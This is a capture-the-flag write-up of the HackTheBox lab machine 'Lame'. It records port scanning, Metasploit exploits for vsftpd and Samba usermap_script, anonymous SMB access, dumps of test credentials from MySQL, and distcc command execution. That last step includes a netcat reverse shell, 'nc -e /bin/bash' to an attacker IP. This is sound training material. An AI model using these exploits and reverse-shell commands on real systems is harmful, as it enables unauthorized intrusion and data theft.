![](attachments/Pasted%20image%2020251016184744.png)

# HackTheBox — Lame Notes by R4ndH3x

- [1.1 Port Scanning](#11-port-scanning)
	- [1.1.1 (critical) OpenSSH 4.7p1 outdated version](#111-critical-openssh-47p1-outdated-version)
	- [1.1.2 (critical) vsftpd 2.3.4 Backdoor Command Execution CVE-2011-2523](#112-critical-vsftpd-234-backdoor-command-execution-cve-2011-2523)
		- [1.1.2.1 Search](#1121-search)
		- [1.1.2.2 Configure](#1122-configure)
		- [1.1.2.3 Exploit](#1123-exploit)
	- [1.1.3 (medium) Samba 3.0.20 Anonymous Access](#113-medium-samba-3020-anonymous-access)
		- [1.1.3.1 Dump /tmp](#1131-dump-tmp)
	- [1.1.4 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447](#114-critical-samba-3020-remote-command-execution-as-root-cve-2007-2447)
		- [1.1.4.1 Search](#1141-search)
		- [1.1.4.2 Configure](#1142-configure)
		- [1.1.4.3 Exploit](#1143-exploit)
	- [1.1.5 (high) mysql root access without password CWE-258](#115-high-mysql-root-access-without-password-cwe-258)
		- [1.1.5.1 Dump Database](#1151-dump-database)
		- [1.1.5.2 Dump dvwa](#1152-dump-dvwa)
		- [1.1.5.3 Dump mysql](#1153-dump-mysql)
		- [1.1.5.4 Dump owasp10](#1154-dump-owasp10)
		- [1.1.5.5 Dump tikiwiki](#1155-dump-tikiwiki)
		- [1.1.5.6 Dump tikiwiki195](#1156-dump-tikiwiki195)
	- [1.1.6 (critical) distcc 2.x Remote Command Execution CVE-2004-2687](#116-critical-distcc-2x-remote-command-execution-cve-2004-2687)
		- [1.1.6.1 Search](#1161-search)
		- [1.1.6.1 Confirmation](#1161-confirmation)
		- [1.1.6.2 Exploit](#1162-exploit)


## 1.1 Port Scanning

`nmap -sC -sV -oA nmap/lame -vv -Pn lame.htb`

| Port | Protocol | State | Service     | Reason  | Product    | Version               | Extra Info           |
| ---- | -------- | ----- | ----------- | ------- | ---------- | --------------------- | -------------------- |
| 21   | tcp      | open  | ftp         | syn-ack | vsftpd     | 2.3.4                 |                      |
| 22   | tcp      | open  | ssh         | syn-ack | OpenSSH    | 4.7p1 Debian 8ubuntu1 | protocol 2.0         |
| 139  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.X - 4.X             | workgroup: WORKGROUP |
| 445  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.0.20-Debian         | workgroup: WORKGROUP |

### 1.1.1 (critical) OpenSSH 4.7p1 outdated version

OpenSSH 4.7p1 is considered outdated and potentially insecure, lacking numerous security features and patches present in later versions.

Reference: https://www.cvedetails.com/version/430455/Openbsd-Openssh-4.7p1.html
### 1.1.2 (critical) vsftpd 2.3.4 Backdoor Command Execution CVE-2011-2523

vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.

Reference: https://www.cvedetails.com/cve/CVE-2011-2523
#### 1.1.2.1 Search

```less
┌─[✗]─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
└──╼ $ searchsploit "vsftpd 2.3.4"
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                            | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                               | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### 1.1.2.2 Configure

```less
┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
└──╼ $ sudo msfconsole

[msf](Jobs:0 Agents:0) >> search "vsftpd 2.3.4"

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST lame.htb 

RHOST => lame.htb
```

#### 1.1.2.3 Exploit

```less
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
[*] 10.129.159.140:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.159.140:21 - USER: 331 Please specify the password.

[*] Exploit completed, but no session was created.
```



### 1.1.3 (medium) Samba 3.0.20 Anonymous Access

There is unauthorized anonymous access to the SMB share, allowing file creation and reading, which could lead to sensitive information being stored or exposed.

#### 1.1.3.1 Dump /tmp

```less
└──╼ $ smbclient --no-pass //lame.htb/tmp

Anonymous login successful

Try "help" to get a list of possible commands.

smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *

getting file \.X0-lock of size 11 as .X0-lock (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED opening remote file \5606.jsvc_up
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \vmware-root\*
NT_STATUS_ACCESS_DENIED opening remote file \.X11-unix\X0

smb: \> exit

┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame/smb/tmp]
└──╼ $ ls
vgauthsvclog.txt.0  vmware-root
```

### 1.1.4 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447

The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

Source: https://www.cvedetails.com/cve/CVE-2007-2447

#### 1.1.4.1 Search

```less
└──╼ $ searchsploit "Samba 3.0.20"
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                     | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### 1.1.4.2 Configure 

```less
┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
└──╼ $ sudo msfconsole

[msf](Jobs:0 Agents:0) >> search "Samba 3.0.20"

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOST lame.htb
RHOST => lame.htb

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.48
LHOST => 10.10.14.48
```

#### 1.1.4.3 Exploit

```less
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit

[*] Started reverse TCP handler on 10.10.14.48:4444 
[*] Command shell session 1 opened (10.10.14.48:4444 -> 10.129.159.140:47175) at 2025-10-18 15:00:23 +0000

script /dev/null -c bash
root@lame:/# id && whoami 
uid=0(root) gid=0(root)
root
```
### 1.1.5 (high) mysql root access without password CWE-258

Successful connection to MySQL as the **root** user without a password using the shell gained from [1.1.3 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447](#114-critical-samba-3020-remote-command-execution-as-root-cve-2007-2447)
#### 1.1.5.1 Dump Database

```less
root@lame:/# mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 17
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)
```

#### 1.1.5.2 Dump dvwa

```less
mysql> use dvwa;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      | 
| users          | 
+----------------+
2 rows in set (0.00 sec)

mysql> SELECT * from guestbook;
+------------+-------------------------+------+
| comment_id | comment                 | name |
+------------+-------------------------+------+
|          1 | This is a test comment. | test | 
+------------+-------------------------+------+
1 row in set (0.00 sec)

mysql> SELECT * from users;
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
| user_id | first_name | last_name | user    | password                         | avatar                                                |
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
5 rows in set (0.00 sec)
```

#### 1.1.5.3 Dump mysql

```mysql
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              | 
| db                        | 
| func                      | 
| help_category             | 
| help_keyword              | 
| help_relation             | 
| help_topic                | 
| host                      | 
| proc                      | 
| procs_priv                | 
| tables_priv               | 
| time_zone                 | 
| time_zone_leap_second     | 
| time_zone_name            | 
| time_zone_transition      | 
| time_zone_transition_type | 
| user                      | 
+---------------------------+
17 rows in set (0.02 sec)

mysql> select * from user;

3 rows in set (0.00 sec)

mysql> select User, Password from user;
+------------------+----------+
| User             | Password |
+------------------+----------+
| debian-sys-maint |          | 
| root             |          | 
| guest            |          | 
+------------------+----------+
3 rows in set (0.00 sec)

```

#### 1.1.5.4 Dump owasp10

```less
mysql> use owasp10;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_owasp10 |
+-------------------+
| accounts          | 
| blogs_table       | 
| captured_data     | 
| credit_cards      | 
| hitlog            | 
| pen_test_tools    | 
+-------------------+
6 rows in set (0.00 sec)

mysql> select * from accounts;
+-----+----------+--------------+-----------------------------+----------+
| cid | username | password     | mysignature                 | is_admin |
+-----+----------+--------------+-----------------------------+----------+
|   1 | admin    | adminpass    | Monkey!                     | TRUE     | 
|   2 | adrian   | somepassword | Zombie Films Rock!          | TRUE     | 
|   3 | john     | monkey       | I like the smell of confunk | FALSE    | 
|   4 | jeremy   | password     | d1373 1337 speak            | FALSE    | 
|   5 | bryce    | password     | I Love SANS                 | FALSE    | 
|   6 | samurai  | samurai      | Carving Fools               | FALSE    | 
|   7 | jim      | password     | Jim Rome is Burning         | FALSE    | 
|   8 | bobby    | password     | Hank is my dad              | FALSE    | 
|   9 | simba    | password     | I am a cat                  | FALSE    | 
|  10 | dreveil  | password     | Preparation H               | FALSE    | 
|  11 | scotty   | password     | Scotty Do                   | FALSE    | 
|  12 | cal      | password     | Go Wildcats                 | FALSE    | 
|  13 | john     | password     | Do the Duggie!              | FALSE    | 
|  14 | kevin    | 42           | Doug Adams rocks            | FALSE    | 
|  15 | dave     | set          | Bet on S.E.T. FTW           | FALSE    | 
|  16 | ed       | pentest      | Commandline KungFu anyone?  | FALSE    | 
+-----+----------+--------------+-----------------------------+----------+
16 rows in set (0.00 sec)
```

#### 1.1.5.5 Dump tikiwiki

```less
mysql> use tikiwiki;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------------+
| Tables_in_tikiwiki                 |
+------------------------------------+
<SNIP>
| tiki_zones                         | 
| users_grouppermissions             | 
| users_groups                       | 
| users_objectpermissions            | 
| users_permissions                  | 
| users_usergroups                   | 
| users_users                        | 
+------------------------------------+
194 rows in set (0.01 sec)

mysql> select login,password from users_users;
+-------+----------+
| login | password |
+-------+----------+
| admin | admin    | 
+-------+----------+
1 row in set (0.00 sec)
```

#### 1.1.5.6 Dump tikiwiki195

```less
mysql> use tikiwiki195;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------------+
| Tables_in_tikiwiki                 |
+------------------------------------+
<SNIP>
| tiki_zones                         | 
| users_grouppermissions             | 
| users_groups                       | 
| users_objectpermissions            | 
| users_permissions                  | 
| users_usergroups                   | 
| users_users                        | 
+------------------------------------+
194 rows in set (0.01 sec)

mysql> select login,password from users_users;
+-------+----------+
| login | password |
+-------+----------+
| admin | admin    | 
+-------+----------+
1 row in set (0.00 sec)
```


### 1.1.6 (critical) distcc 2.x Remote Command Execution CVE-2004-2687

distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.

Reference: https://www.cvedetails.com/cve/CVE-2004-2687/

#### 1.1.6.1 Search

```less
root@lame:/home/user# distccd --version
distccd 2.18.3 i486-pc-linux-gnu (protocols 1 and 2) (default port 3632)
  built May  1 2007 10:25:30
Copyright (C) 2002, 2003, 2004 by Martin Pool.
Includes miniLZO (C) 1996-2002 by Markus Franz Xaver Johannes Oberhumer.

distcc comes with ABSOLUTELY NO WARRANTY.  distcc is free software, and
you may use, modify and redistribute it under the terms of the GNU 
General Public License version 2 or later.

```

#### 1.1.6.1 Confirmation

```less
┌─[✗]─[r4ndhex@parrot]─[~]
└──╼ $nmap -p 3632 -Pn --script distcc-* lame.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 13:52 UTC
Nmap scan report for lame.htb (10.129.159.140)
Host is up (0.12s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

#### 1.1.6.2 Exploit

```less
┌─[r4ndhex@parrot]─[~]
└──╼ $ nmap -p 3632 -Pn --script distcc-cve2004-2687 --script-args "distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.48 9002'" lame.htb

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 13:52 UTC

┌─[✗]─[r4ndhex@parrot]─[~]
└──╼ $sudo nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.129.159.140 46245


script /dev/null -c bash
daemon@lame:/tmp$ whoami
daemon
```